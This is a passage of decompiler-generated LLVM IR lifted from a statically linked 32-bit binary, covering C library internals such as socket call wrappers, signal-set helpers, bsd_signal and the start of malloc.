  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805f0ff = ptrtoint i32* %stack_var_-24 to i32
  %v2_805f106 = call i32 @__socketcall(i32 11, i32 %v2_805f0ff)
  ret i32 %v2_805f106

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805f13b = ptrtoint i32* %stack_var_-20 to i32
  %v2_805f142 = call i32 @__socketcall(i32 14, i32 %v2_805f13b)
  ret i32 %v2_805f142

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805f167 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805f16e = call i32 @__socketcall(i32 1, i32 %v2_805f167)
  ret i32 %v2_805f16e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 1, 8, 12, 7, 11, 10, 5, 4, 9, 6, 2, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805f190, label %dec_label_pc_805f183

dec_label_pc_805f183:                             ; preds = %entry
  %v1_805f183 = add i32 %arg1, -64
  %v3_805f183 = sub i32 63, %arg1
  %v4_805f183 = and i32 %v3_805f183, %arg1
  %v5_805f183 = icmp slt i32 %v4_805f183, 0
  %v6_805f183 = icmp eq i32 %v1_805f183, 0
  %v7_805f183 = icmp slt i32 %v1_805f183, 0
  %v3_805f186 = icmp eq i1 %v7_805f183, %v5_805f183
  %v4_805f186 = icmp eq i1 %v6_805f183, false
  %v5_805f186 = and i1 %v4_805f186, %v3_805f186
  br i1 %v5_805f186, label %dec_label_pc_805f190, label %dec_label_pc_805f188

dec_label_pc_805f188:                             ; preds = %dec_label_pc_805f183
  %v4_805f18b = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805f190

dec_label_pc_805f190:                             ; preds = %dec_label_pc_805f183, %entry, %dec_label_pc_805f188
  %v1_805f190 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805f195 = inttoptr i32 %v1_805f190 to i32*
  store i32 22, i32* %v1_805f195, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805f183, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805f190, { 2, 0, 1 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805f1bc, label %dec_label_pc_805f1af

dec_label_pc_805f1af:                             ; preds = %entry
  %v1_805f1af = add i32 %arg1, -64
  %v3_805f1af = sub i32 63, %arg1
  %v4_805f1af = and i32 %v3_805f1af, %arg1
  %v5_805f1af = icmp slt i32 %v4_805f1af, 0
  %v6_805f1af = icmp eq i32 %v1_805f1af, 0
  %v7_805f1af = icmp slt i32 %v1_805f1af, 0
  %v3_805f1b2 = icmp eq i1 %v7_805f1af, %v5_805f1af
  %v4_805f1b2 = icmp eq i1 %v6_805f1af, false
  %v5_805f1b2 = and i1 %v4_805f1b2, %v3_805f1b2
  br i1 %v5_805f1b2, label %dec_label_pc_805f1bc, label %dec_label_pc_805f1b4

dec_label_pc_805f1b4:                             ; preds = %dec_label_pc_805f1af
  %v0_805f1b7 = call i32 @__sigdelset()
  br label %dec_label_pc_805f1bc

dec_label_pc_805f1bc:                             ; preds = %dec_label_pc_805f1af, %entry, %dec_label_pc_805f1b4
  %v1_805f1bc = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805f1c1 = inttoptr i32 %v1_805f1bc to i32*
  store i32 22, i32* %v1_805f1c1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805f1af, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805f1bc, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805f1de = inttoptr i32 %arg1 to i8*
  %v4_805f1de = call i32 @__GI_memset(i8* %v3_805f1de, i32 0, i32 128)
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805f1fd = inttoptr i32 %arg1 to i8*
  %v4_805f1fd = call i32 @__GI_memset(i8* %v3_805f1fd, i32 255, i32 128)
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805f220, label %dec_label_pc_805f213

dec_label_pc_805f213:                             ; preds = %entry
  %v1_805f213 = add i32 %arg1, -64
  %v3_805f213 = sub i32 63, %arg1
  %v4_805f213 = and i32 %v3_805f213, %arg1
  %v5_805f213 = icmp slt i32 %v4_805f213, 0
  %v6_805f213 = icmp eq i32 %v1_805f213, 0
  %v7_805f213 = icmp slt i32 %v1_805f213, 0
  %v3_805f216 = icmp eq i1 %v7_805f213, %v5_805f213
  %v4_805f216 = icmp eq i1 %v6_805f213, false
  %v5_805f216 = and i1 %v4_805f216, %v3_805f216
  br i1 %v5_805f216, label %dec_label_pc_805f220, label %dec_label_pc_805f218

dec_label_pc_805f218:                             ; preds = %dec_label_pc_805f213
  %v4_805f21b = call i32 @__sigismember(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805f220

dec_label_pc_805f220:                             ; preds = %dec_label_pc_805f213, %entry, %dec_label_pc_805f218
  %v1_805f220 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805f225 = inttoptr i32 %v1_805f220 to i32*
  store i32 22, i32* %v1_805f225, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805f213, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805f220, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_805f234 = load i32, i32* @ebx, align 4
  store i32 %tmp2, i32* @ebx, align 4
  %v4_805f23c = icmp eq i32 %tmp, 0
  br i1 %v4_805f23c, label %dec_label_pc_805f25d, label %dec_label_pc_805f243

dec_label_pc_805f243:                             ; preds = %entry
  %v1_805f244 = add i32 %tmp2, 28
  %v4_805f24c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* null, i32 %v1_805f244)
  %v1_805f259 = icmp eq i32 %v4_805f24c, 0
  br i1 %v1_805f259, label %dec_label_pc_805f25f, label %dec_label_pc_805f25d

dec_label_pc_805f25d:                             ; preds = %dec_label_pc_805f243, %entry
  br label %dec_label_pc_805f25f

dec_label_pc_805f25f:                             ; preds = %dec_label_pc_805f243, %dec_label_pc_805f25d
  %v0_805f25f = phi i32 [ 1, %dec_label_pc_805f243 ], [ 0, %dec_label_pc_805f25d ]
  %v1_805f25f = load i32, i32* @ebx, align 4
  %v2_805f25f = add i32 %v1_805f25f, 24
  %v3_805f25f = inttoptr i32 %v2_805f25f to i32*
  store i32 %v0_805f25f, i32* %v3_805f25f, align 4
  store i32 %v0_805f234, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_805f25f, { 1, 0 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_805f268 = load i32, i32* @ebx, align 4
  %v15_805f269 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_805f27d = icmp eq i32 %arg2, -1
  br i1 %v10_805f27d, label %dec_label_pc_805f28b, label %dec_label_pc_805f282

dec_label_pc_805f282:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_805f28b, label %dec_label_pc_805f286

dec_label_pc_805f286:                             ; preds = %dec_label_pc_805f282
  %v7_805f289 = icmp sgt i32 %arg1, 64
  br i1 %v7_805f289, label %dec_label_pc_805f28b, label %dec_label_pc_805f298

dec_label_pc_805f28b:                             ; preds = %dec_label_pc_805f286, %dec_label_pc_805f282, %entry
  %v1_805f28b = call i32 @__errno_location(i32 %v0_805f268)
  store i32 %v1_805f28b, i32* %eax.global-to-local, align 4
  %v1_805f290 = inttoptr i32 %v1_805f28b to i32*
  store i32 22, i32* %v1_805f290, align 4
  br label %dec_label_pc_805f30c

dec_label_pc_805f298:                             ; preds = %dec_label_pc_805f286
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f2a6

dec_label_pc_805f2a6:                             ; preds = %dec_label_pc_805f2a6.dec_label_pc_805f2a6_crit_edge, %dec_label_pc_805f298
  %v0_805f2a6 = phi i32 [ %v15_805f269, %dec_label_pc_805f298 ], [ %v0_805f2a6.pre, %dec_label_pc_805f2a6.dec_label_pc_805f2a6_crit_edge ]
  %v1_805f2b117 = phi i32 [ 31, %dec_label_pc_805f298 ], [ %v1_805f2b1, %dec_label_pc_805f2a6.dec_label_pc_805f2a6_crit_edge ]
  %v2_805f2a6 = mul i32 %v1_805f2b117, 4
  %v3_805f2a6 = add i32 %v2_805f2a6, 160
  %v4_805f2a6 = add i32 %v3_805f2a6, %v0_805f2a6
  %v5_805f2a6 = inttoptr i32 %v4_805f2a6 to i32*
  store i32 0, i32* %v5_805f2a6, align 4
  %v0_805f2b1.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805f2b1 = add i32 %v0_805f2b1.pre, -1
  %v9_805f2b1 = icmp slt i32 %v1_805f2b1, 0
  store i32 %v1_805f2b1, i32* %eax.global-to-local, align 4
  %v1_805f2b2 = icmp eq i1 %v9_805f2b1, false
  br i1 %v1_805f2b2, label %dec_label_pc_805f2a6.dec_label_pc_805f2a6_crit_edge, label %dec_label_pc_805f2b4

dec_label_pc_805f2a6.dec_label_pc_805f2a6_crit_edge: ; preds = %dec_label_pc_805f2a6
  %v0_805f2a6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805f2a6

dec_label_pc_805f2b4:                             ; preds = %dec_label_pc_805f2a6
  %v0_805f2b4 = load i32, i32* @edx, align 4
  %v2_805f2b7 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805f2b7, i32* %eax.global-to-local, align 4
  %v4_805f2bf = call i32 @__sigaddset(i32 %v2_805f2b7, i32 %arg1, i32 %v0_805f2b4, i32 %v0_805f2b4)
  store i32 %v4_805f2bf, i32* %eax.global-to-local, align 4
  %v2_805f2c7 = icmp slt i32 %v4_805f2bf, 0
  br i1 %v2_805f2c7, label %dec_label_pc_805f30c, label %dec_label_pc_805f2cb

dec_label_pc_805f2cb:                             ; preds = %dec_label_pc_805f2b4
  %v4_805f2d3 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_807e5a0.731 to i32), i32 %arg1, i32 %v4_805f2bf, i32 %v4_805f2bf)
  %v2_805f2ec = ptrtoint i32* %stack_var_-284 to i32
  %v2_805f2f1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805f2f1, i32* %eax.global-to-local, align 4
  %v4_805f2fa = call i32 @__GI_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_805f2ec)
  store i32 %v4_805f2fa, i32* %eax.global-to-local, align 4
  %v2_805f302 = icmp slt i32 %v4_805f2fa, 0
  br i1 %v2_805f302, label %dec_label_pc_805f30c, label %dec_label_pc_805f306

dec_label_pc_805f306:                             ; preds = %dec_label_pc_805f2cb
  %v3_805f306 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_805f30f

dec_label_pc_805f30c:                             ; preds = %dec_label_pc_805f2cb, %dec_label_pc_805f2b4, %dec_label_pc_805f28b
  br label %dec_label_pc_805f30f

dec_label_pc_805f30f:                             ; preds = %dec_label_pc_805f306, %dec_label_pc_805f30c
  %storemerge = phi i32 [ -1, %dec_label_pc_805f30c ], [ %v3_805f306, %dec_label_pc_805f306 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805f268, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805f2b1, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 4, 3, 1, 2, 0, 5 }
  uselistorder label %dec_label_pc_805f30f, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805f326 = add i32 %arg2, -1
  %v1_805f329 = urem i32 %v1_805f326, 32
  %v2_805f329 = icmp eq i32 %v1_805f329, 0
  store i32 %v1_805f329, i32* @ecx, align 4
  %v2_805f32c = udiv i32 %v1_805f326, 32
  br i1 %v2_805f329, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805f32f = shl i32 1, %v1_805f329
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805f331 = phi i32 [ 1, %entry ], [ %v5_805f32f, %bb ]
  %v2_805f331 = mul nuw nsw i32 %v2_805f32c, 4
  %v3_805f331 = add i32 %v2_805f331, %arg1
  %v4_805f331 = inttoptr i32 %v3_805f331 to i32*
  %v5_805f331 = load i32, i32* %v4_805f331, align 4
  %v7_805f331 = and i32 %v5_805f331, %v6_805f331
  %v8_805f331 = icmp eq i32 %v7_805f331, 0
  %v1_805f335 = icmp eq i1 %v8_805f331, false
  %v2_805f335 = zext i1 %v1_805f335 to i32
  ret i32 %v2_805f335

; uselistorder directives
  uselistorder i32 %v1_805f329, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805f33c = load i32, i32* @ebx, align 4
  store i32 %v0_805f33c, i32* %stack_var_-4, align 4
  %v1_805f34a = add i32 %arg2, -1
  %v1_805f34d = urem i32 %v1_805f34a, 32
  %v2_805f34d = icmp eq i32 %v1_805f34d, 0
  store i32 %v1_805f34d, i32* @ecx, align 4
  %v2_805f350 = udiv i32 %v1_805f34a, 32
  store i32 %v2_805f350, i32* @edx, align 4
  br i1 %v2_805f34d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805f353 = shl i32 1, %v1_805f34d
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805f355 = phi i32 [ 1, %entry ], [ %v5_805f353, %bb ]
  %v2_805f355 = mul nuw nsw i32 %v2_805f350, 4
  %v3_805f355 = add i32 %v2_805f355, %arg1
  %v4_805f355 = inttoptr i32 %v3_805f355 to i32*
  %v5_805f355 = load i32, i32* %v4_805f355, align 4
  %v7_805f355 = or i32 %v5_805f355, %v6_805f355
  store i32 %v7_805f355, i32* %v4_805f355, align 4
  %v2_805f35a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805f35a, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805f350, { 1, 0 }
  uselistorder i32 %v1_805f34d, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805f35c = load i32, i32* @ebx, align 4
  store i32 %v0_805f35c, i32* %stack_var_-4, align 4
  %v1_805f36a = add i32 %tmp2, -1
  %v1_805f36d = urem i32 %v1_805f36a, 32
  %v2_805f36d = icmp eq i32 %v1_805f36d, 0
  %v2_805f370 = udiv i32 %v1_805f36a, 32
  br i1 %v2_805f36d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_805f373 = shl i32 -2, %v1_805f36d
  %v5_805f373 = sub nsw i32 32, %v1_805f36d
  %v6_805f373 = lshr i32 -2, %v5_805f373
  %v7_805f373 = or i32 %v6_805f373, %v4_805f373
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805f375 = phi i32 [ -2, %entry ], [ %v7_805f373, %bb ]
  %v2_805f375 = mul nuw nsw i32 %v2_805f370, 4
  %v3_805f375 = add i32 %v2_805f375, %tmp
  %v4_805f375 = inttoptr i32 %v3_805f375 to i32*
  %v5_805f375 = load i32, i32* %v4_805f375, align 4
  %v7_805f375 = and i32 %v5_805f375, %v6_805f375
  store i32 %v7_805f375, i32* %v4_805f375, align 4
  %v2_805f37a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805f37a, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805f36d, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_805f37c = load i32, i32* @eax, align 4
  %v6_805f38f = icmp ugt i32 %v0_805f37c, 16777215
  br i1 %v6_805f38f, label %dec_label_pc_805f3a0, label %dec_label_pc_805f391

dec_label_pc_805f391:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_805f37c, 256
  %v2_805f37f = udiv i32 %v0_805f37c, 256
  %v2_805f391 = call i32 @llvm.ctlz.i32(i32 %v2_805f37f, i1 true)
  %v3_805f391 = xor i32 %v2_805f391, 31
  %v5_805f391 = select i1 %tmp, i32 95, i32 %v3_805f391
  %v1_805f394 = add nuw nsw i32 %v5_805f391, 6
  store i32 %v1_805f394, i32* @ecx, align 4
  %v2_805f397 = urem i32 %v1_805f394, 32
  %v4_805f397 = icmp eq i32 %v2_805f397, 0
  br i1 %v4_805f397, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_805f391
  %v5_805f397 = lshr i32 %v0_805f37c, %v2_805f397
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_805f391, %bb
  %v0_805f399 = phi i32 [ %v0_805f37c, %dec_label_pc_805f391 ], [ %v5_805f397, %bb ]
  %v1_805f399 = urem i32 %v0_805f399, 4
  %v2_805f39c = mul nuw nsw i32 %v5_805f391, 4
  %v3_805f39c = or i32 %v1_805f399, 32
  %v4_805f39c = add nuw nsw i32 %v3_805f39c, %v2_805f39c
  br label %dec_label_pc_805f3a0

dec_label_pc_805f3a0:                             ; preds = %entry, %bb4
  %v0_805f3a1 = phi i32 [ 95, %entry ], [ %v4_805f39c, %bb4 ]
  ret i32 %v0_805f3a1

; uselistorder directives
  uselistorder i32 %v2_805f397, { 1, 0 }
  uselistorder i32 %v0_805f37c, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_805f3a0, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805f3a2 = load i32, i32* @ebp, align 4
  %v0_805f3a3 = load i32, i32* @edi, align 4
  %v0_805f3a4 = load i32, i32* @esi, align 4
  %v0_805f3a5 = load i32, i32* @ebx, align 4
  store i32 %v0_805f3a5, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805f3b7 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805f3b7, i32* %eax.global-to-local, align 4
  store i32 %v2_805f3b7, i32* %stack_var_-92, align 4
  %v4_805f3bc = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  store i32 %v4_805f3bc, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074750.648 to i32), i32* %stack_var_-92, align 4
  %v1_805f3c8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  store i32 %v1_805f3c8, i32* %eax.global-to-local, align 4
  %v0_805f3d0 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_805f3d0, -32
  br i1 %tmp, label %dec_label_pc_805f3e7, label %dec_label_pc_805f3d5

dec_label_pc_805f3d5:                             ; preds = %entry
  %v0_805f3d5 = load i32, i32* %stack_var_-92, align 4
  %v1_805f3d5 = call i32 @__errno_location(i32 %v0_805f3d5)
  store i32 %v1_805f3d5, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805f3dc = inttoptr i32 %v1_805f3d5 to i32*
  store i32 12, i32* %v1_805f3dc, align 4
  br label %dec_label_pc_805fb0c

dec_label_pc_805f3e7:                             ; preds = %entry
  %v1_805f3e7 = add i32 %v0_805f3d0, 11
  %tmp127 = icmp ult i32 %v1_805f3e7, 16
  br i1 %tmp127, label %dec_label_pc_805f3fe, label %dec_label_pc_805f3f7

dec_label_pc_805f3f7:                             ; preds = %dec_label_pc_805f3e7
  %v1_805f3f7 = and i32 %v1_805f3e7, -8
  br label %dec_label_pc_805f3fe

dec_label_pc_805f3fe:                             ; preds = %dec_label_pc_805f3e7, %dec_label_pc_805f3f7
  %storemerge131 = phi i32 [ %v1_805f3f7, %dec_label_pc_805f3f7 ], [ %v1_805f3e7, %dec_label_pc_805f3e7 ]
  %v1_805f796 = phi i32 [ %v1_805f3f7, %dec_label_pc_805f3f7 ], [ 16, %dec_label_pc_805f3e7 ]
  store i32 %storemerge131, i32* %eax.global-to-local, align 4
  %v0_805f3fe = load i8, i8* @global_var_807e620.732, align 1
  %v1_805f3fe = sext i8 %v0_805f3fe to i32
  store i32 %v1_805f3fe, i32* @ebx, align 4
  %v3_805f404 = urem i8 %v0_805f3fe, 2
  %v4_805f404 = icmp eq i8 %v3_805f404, 0
  %v1_805f407 = icmp eq i1 %v4_805f404, false
  br i1 %v1_805f407, label %dec_label_pc_805f426, label %dec_label_pc_805f409

dec_label_pc_805f409:                             ; preds = %dec_label_pc_805f3fe
  %v2_805f409 = icmp eq i8 %v0_805f3fe, 0
  %v1_805f40b = icmp eq i1 %v2_805f409, false
  br i1 %v1_805f40b, label %dec_label_pc_805f701, label %dec_label_pc_805f411

dec_label_pc_805f411:                             ; preds = %dec_label_pc_805f409
  store i32 ptrtoint (i8* @global_var_807e620.732 to i32), i32* %stack_var_-92, align 4
  %v2_805f419 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807e620.732 to i32*))
  store i32 %v2_805f419, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f701

dec_label_pc_805f426:                             ; preds = %dec_label_pc_805f3fe
  %v11_805f426 = trunc i32 %v1_805f796 to i8
  %v8_805f42a = icmp ugt i8 %v11_805f426, %v0_805f3fe
  br i1 %v8_805f42a, label %dec_label_pc_805f447, label %dec_label_pc_805f42c

dec_label_pc_805f42c:                             ; preds = %dec_label_pc_805f426
  %v2_805f430 = udiv i32 %v1_805f796, 2
  store i32 %v2_805f430, i32* %eax.global-to-local, align 4
  %v1_805f432 = add i32 %v2_805f430, ptrtoint (i8* @global_var_807e620.732 to i32)
  store i32 %v1_805f432, i32* @ecx, align 4
  %v1_805f438 = add i32 %v2_805f430, add (i32 ptrtoint (i8* @global_var_807e620.732 to i32), i32 -4)
  %v2_805f438 = inttoptr i32 %v1_805f438 to i32*
  %v3_805f438 = load i32, i32* %v2_805f438, align 4
  store i32 %v3_805f438, i32* %edx.global-to-local, align 4
  %v1_805f43b = icmp eq i32 %v3_805f438, 0
  br i1 %v1_805f43b, label %dec_label_pc_805f447, label %dec_label_pc_805f43f

dec_label_pc_805f43f:                             ; preds = %dec_label_pc_805f42c
  %v1_805f43f = add i32 %v3_805f438, 8
  %v2_805f43f = inttoptr i32 %v1_805f43f to i32*
  %v3_805f43f = load i32, i32* %v2_805f43f, align 4
  store i32 %v3_805f43f, i32* %eax.global-to-local, align 4
  store i32 %v3_805f43f, i32* %v2_805f438, align 4
  br label %dec_label_pc_805f480

dec_label_pc_805f447:                             ; preds = %dec_label_pc_805f42c, %dec_label_pc_805f426
  %v8_805f447 = icmp ult i32 %v1_805f796, 255
  %v6_805f44f = icmp ugt i32 %v1_805f796, 255
  store i32 %v1_805f796, i32* @eax, align 4
  br i1 %v6_805f44f, label %dec_label_pc_805f488, label %dec_label_pc_805f451

dec_label_pc_805f451:                             ; preds = %dec_label_pc_805f447
  %v2_805f455 = udiv i32 %v1_805f796, 8
  store i32 %v2_805f455, i32* %eax.global-to-local, align 4
  %v1_805f45c = mul nuw i32 %v2_805f455, 8
  %v2_805f45c = add i32 %v1_805f45c, ptrtoint (i32* @global_var_807e64c.733 to i32)
  store i32 %v2_805f45c, i32* @ecx, align 4
  %v1_805f463 = add i32 %v1_805f45c, add (i32 ptrtoint (i32* @global_var_807e64c.733 to i32), i32 12)
  %v2_805f463 = inttoptr i32 %v1_805f463 to i32*
  %v3_805f463 = load i32, i32* %v2_805f463, align 4
  store i32 %v3_805f463, i32* %edx.global-to-local, align 4
  %v12_805f466 = icmp eq i32 %v3_805f463, %v2_805f45c
  br i1 %v12_805f466, label %dec_label_pc_805f584.preheader, label %dec_label_pc_805f46e

dec_label_pc_805f46e:                             ; preds = %dec_label_pc_805f451
  store i32 %v1_805f796, i32* %ebx.global-to-local, align 4
  %v1_805f472 = add i32 %v3_805f463, 12
  %v2_805f472 = inttoptr i32 %v1_805f472 to i32*
  %v3_805f472 = load i32, i32* %v2_805f472, align 4
  store i32 %v3_805f472, i32* %eax.global-to-local, align 4
  store i32 %v3_805f472, i32* %v2_805f463, align 4
  %v0_805f478 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f478 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805f478 = add i32 %v0_805f478, 4
  %v3_805f478 = add i32 %v2_805f478, %v1_805f478
  %v4_805f478 = inttoptr i32 %v3_805f478 to i32*
  %v5_805f478 = load i32, i32* %v4_805f478, align 4
  %v6_805f478 = or i32 %v5_805f478, 1
  store i32 %v6_805f478, i32* %v4_805f478, align 4
  %v0_805f47d = load i32, i32* @ecx, align 4
  %v1_805f47d = load i32, i32* %eax.global-to-local, align 4
  %v2_805f47d = add i32 %v1_805f47d, 8
  %v3_805f47d = inttoptr i32 %v2_805f47d to i32*
  store i32 %v0_805f47d, i32* %v3_805f47d, align 4
  br label %dec_label_pc_805f480

dec_label_pc_805f480:                             ; preds = %dec_label_pc_805f81d, %dec_label_pc_805f82f, %dec_label_pc_805f43f, %dec_label_pc_805f46e
  %v0_805f480 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f480 = add i32 %v0_805f480, 8
  store i32 %v1_805f480, i32* @ebx, align 4
  br label %dec_label_pc_805fafb

dec_label_pc_805f488:                             ; preds = %dec_label_pc_805f447
  %v0_805f48c = call i32 @__malloc_largebin_index()
  store i32 %v0_805f48c, i32* %eax.global-to-local, align 4
  %v3_805f491 = and i8 %v0_805f3fe, 2
  %v4_805f491 = icmp eq i8 %v3_805f491, 0
  %v6_805f491 = zext i8 %v3_805f491 to i32
  %v9_805f491 = and i32 %v1_805f3fe, -256
  %v10_805f491 = or i32 %v9_805f491, %v6_805f491
  store i32 %v10_805f491, i32* @ebx, align 4
  br i1 %v4_805f491, label %dec_label_pc_805f584.preheader, label %dec_label_pc_805f49e

dec_label_pc_805f49e:                             ; preds = %dec_label_pc_805f488
  store i32 ptrtoint (i8* @global_var_807e620.732 to i32), i32* %stack_var_-92, align 4
  %v2_805f4a6 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807e620.732 to i32*))
  store i32 %v2_805f4a6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f584.preheader

dec_label_pc_805f584.preheader:                   ; preds = %dec_label_pc_805f49e, %dec_label_pc_805f451, %dec_label_pc_805f488
  %stack_var_-40.0.ph = phi i32 [ %v2_805f455, %dec_label_pc_805f451 ], [ %v0_805f48c, %dec_label_pc_805f49e ], [ %v0_805f48c, %dec_label_pc_805f488 ]
  %v1_805f4da = add i32 %v1_805f796, 16
  %v0_805f584106 = load i32, i32* @global_var_807e660.736, align 32
  store i32 %v0_805f584106, i32* @ebp, align 4
  %v9_805f58a111 = icmp eq i32 %v0_805f584106, 134735444
  %v1_805f590112 = icmp eq i1 %v9_805f58a111, false
